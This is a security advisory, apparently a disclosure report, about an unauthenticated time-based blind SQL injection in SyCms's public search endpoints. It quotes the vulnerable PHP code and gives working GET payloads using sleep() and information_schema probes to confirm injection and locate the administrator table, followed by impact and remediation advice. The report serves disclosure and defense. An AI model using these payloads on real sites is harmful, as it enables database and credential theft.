# SyCms SearchController index/month Unauthenticated Time-Based Blind SQL Injection

## Summary

The public (no login required) Home search actions of sycms - SearchController::index($key) and SearchController::month($month) - concatenate URL-bound parameters directly into string WHERE clauses that are executed by the bundled ThinkPHP 3.x runtime without escaping: title like '%.$key.%' at lines 20/28 and DATE_FORMAT(add_time,'%Y-%m')='.$month.' at lines 43/52 of Application/Home/Controller/SearchController.class.php. URL parameters are bound to action arguments because URL_PARAMS_BIND=true and URL_PARAMS_BIND_TYPE=1 are set in Application/Home/Conf/config.php (lines 25-26), and the binding path applies no meaningful filter (URL_PARAMS_SAFE is not configured and think_filter only touches keyword-like strings). String WHERE conditions are forwarded verbatim by the framework (Model::where -> _string; Db/Driver::parseThinkWhere), so any anonymous visitor can inject arbitrary SQL and extract the whole database (including the sy_admin administrator password hashes) via time-based blind injection.

## Details

Root cause: public search handlers treat externally supplied path parameters as trusted SQL fragments.

Entry point (source):

- The Home module config enables URL parameter binding: 'URL_PARAMS_BIND' => true and 'URL_PARAMS_BIND_TYPE' => 1 (positional binding) in Application/Home/Conf/config.php (lines 25-26). Frame/Library/Think/Dispatcher.class.php (lines 224-232) takes the path segments after module/controller/action and stores them sequentially into $_GET; Frame/Library/Think/App.class.php (lines 126-162) binds them positionally to action method parameters (index($key), month($month)).
- The optional bound-parameter filter is controlled by 'URL_PARAMS_SAFE', which is not configured anywhere (not in Frame/Conf/convention.php, Common/Conf/config.php or Application/Home/Conf/config.php). Therefore the DEFAULT_FILTER=htmlspecialchars branch in App.class.php:152-160 does not run. The only transformation applied is think_filter (App.class.php:161, implemented in Frame/Common/functions.php:1538-1545), which only appends a space when the whole value equals keywords such as EXP/NOTIN/LIKE; it leaves single quotes and SQL functions untouched.

Sink (two injection points in one file):

- SearchController::index (lines 16-37): `where('status=1 AND title like \'%'.$key.'\'')` (line 20) and line 28 (the single quotes must be closed by the attacker).
- SearchController::month (lines 39-61): `where('status=1 AND DATE_FORMAT(add_time,\'%Y-%m\')=\''.$month.'\'')` (line 43) and line 52.
- Framework behavior: Model::where() wraps a string into array('_string'=>$where) (Frame/Library/Think/Model.class.php:1788-1792); Db/Driver::parseThinkWhere emits _string verbatim (`$whereStr = $val;`, Frame/Library/Think/Db/Driver.class.php:613-617). No parseValue/escapeString is applied to string WHERE content, so payloads such as `1) or sleep(1)#` are executed as-is.

Trust-boundary failure: the input validation boundary is bypassed because (a) bound arguments are not routed through I()/DEFAULT_FILTER, and (b) string WHERE clauses bypass the parameterized/escaped code path of the DB driver. A remote, unauthenticated user therefore controls executable SQL in two public endpoints.

Core vulnerable code path:

```php
// Application/Home/Controller/SearchController.class.php:16-37
public function index($key='') {
    if(!$key) $this->error('关键词不能为空');
    $this->assign('keywords',$key);
    $count=M('Article')->where('status=1 AND title like \'%'.$key.'%\'')->count();
    $Page =new \Lib\Page($count,6);
    $Page->url='search/key/'.$key;
    $page =$Page->show();
    $this->assign('page',$page);
    $list_search=M('article a')
        ->join('__CATEGORY__ c ON a.cid=c.id')
        ->where('a.status=1 AND a.title like \'%'.$key.'%\'')
```

The URL-bound $key parameter is inserted into a single-quoted LIKE predicate at lines 20 and 28. An attacker closes the quote (e.g. %25') and appends SQL, so the same unauthenticated time-based blind injection applies to the keyword search endpoint.

```php
// Application/Home/Controller/SearchController.class.php:39-61
public function month($month=''){
    if(!$month) $this->error('月份不能为空');
    $this->assign('month',$month);
    $count=M('Article')->where('status=1 AND DATE_FORMAT(add_time,\'%Y-%m\')=\''.$month.'\'')->count();
    $Page =new \Lib\Page($count,6);
    $Page->url='search/month/'.$month;
    $page =$Page->show();
    $this->assign('page',$page);
    $list_search=M('article a')
        ->join('__CATEGORY__ c ON a.cid=c.id')
        ->where('a.status=1 AND DATE_FORMAT(add_time,\'%Y-%m\')=\''.$month.'\'')
```

The URL-bound $month parameter is concatenated into a quoted string predicate at lines 43 and 52. Like the keyword endpoint, the attacker closes the quote and appends SQL, making the month archive search endpoint equally injectable.

## POC

Preconditions: no authentication or login required. The site simply needs to be installed and contain data in the `sy_article` table (including the default sample articles). The injection relies on a time delay evaluated for each row; the total sleep duration is determined by the number of rows in the table.	

Step 1 - : index endpoint injection validation

GET /index.php?s=/Home/Search/index&key=zzz%25%27)%20or%20sleep(0)%23

Timing: approximately 1 second
<img width="2470" height="1082" alt="image" src="https://github.com/user-attachments/assets/99ff5b27-ae92-42ee-a9b0-7e67f19bc151" />


Change sleep(0) to sleep(1).（key=zzz%25%27)%20or%20sleep(1)%23）

Timing for approximately 15s and `sleep(1)` both result in a delay of approximately 14s.
<img width="2464" height="1082" alt="image" src="https://github.com/user-attachments/assets/9bc27f5c-a86e-4a14-9dc2-546f025e77dd" />


Change sleep(0) to sleep(0.1).（key=zzz%25%27)%20or%20sleep(0.1)%23）

Timing is approximately 2.4 seconds.
<img width="2467" height="1088" alt="image" src="https://github.com/user-attachments/assets/e05851cf-9a10-4500-9d5e-127395814731" />


Step 2 - : month endpoint injection validation

GET /index.php?s=/Home/Search/month/9999-99%27)%20or%20sleep(0)%23.html

Timing: approximately 1 second
<img width="2463" height="1082" alt="image" src="https://github.com/user-attachments/assets/68a872ef-2dcb-42d8-918c-abd914810c34" />


GET /index.php?s=/Home/Search/month/9999-99%27)%20or%20sleep(1)%23.html

Timing for approximately 15s and `sleep(1)` both result in a delay of approximately 14s.
<img width="2470" height="1086" alt="image" src="https://github.com/user-attachments/assets/cf57c5f4-2ed4-4671-beb9-cc496b15b053" />


GET /index.php?s=/Home/Search/month/9999-99%27)%20or%20sleep(0.1)%23.html

Timing is approximately 2.4 seconds.
<img width="2469" height="1083" alt="image" src="https://github.com/user-attachments/assets/bff02d85-eec6-4291-b94d-b93f0496e370" />


Step 3 - : Data extraction via blind injection

GET /index.php?s=/Home/Search/index&key=zzz%25')%20or%20if((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase()%20and%20table_name%3D'sy_admin')%3E0%2Csleep(0.1)%2C0)%23

→ 2.4s (True); sy_admin exists
<img width="2471" height="1087" alt="image" src="https://github.com/user-attachments/assets/84c7229f-2fe9-4bc7-a76c-3e7684f268c8" />


GET /index.php?s=/Home/Search/index&key=zzz%25')%20or%20if((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase()%20and%20table_name%3D'sy1_admin')%3E0%2Csleep(0.1)%2C0)%23

→ 1s (False); sy1_admin does not exist
<img width="2465" height="1075" alt="image" src="https://github.com/user-attachments/assets/0fb52656-4571-45f7-94fd-4127a6e16b97" />


## Impact

An unauthenticated remote attacker can inject arbitrary SQL into two public search endpoints of the Home module and, using time-based blind techniques, read the entire MySQL database: sy_admin administrator credentials (password hashes), all articles/pages/categories/guestbook entries, users and system configuration (including DB credentials, email/SMS settings). Injection also enables resource-exhausting sleep() queries. Integrity impact is limited because these sinks are SELECT queries (no stacked statements demonstrated); the primary impact is complete confidentiality loss of the database.

## Remediation

1) Replace string WHERE concatenation with array conditions or bound parameters in index()/month(), e.g. like predicates built through Model's escaped array operators; 2) enforce strict server-side validation of bound parameters: key/month restricted to a whitelist pattern; 3) enable URL_PARAMS_SAFE and apply a real filter (or rely on array/parameterized queries) so bound parameters cannot carry SQL metacharacters; 4) audit the whole codebase for where("...{$var}") concatenations (ShowController, Admin controllers, AdminModel etc.) and migrate them to parameterized/array queries; 5) upgrade the bundled ThinkPHP 3.x fork or apply upstream escaping fixes.z

## Supplemental Information

### Affected products

- Vendor / project: SyCms
- Repository: https://gitee.com/shanyu/SyCms
- Issue: https://gitee.com/shanyu/SyCms/issues/IKDHYQ
- Affected versions: commit a242ef2d194e8bb249dc175e7c49f2c1673ec921
- Patched versions: none confirmed

### Vulnerability type

- SQL Injection
- CWE: CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- Suggested severity: High

### Reporter

Guangzhou University: Wen Youwen, Wang Le
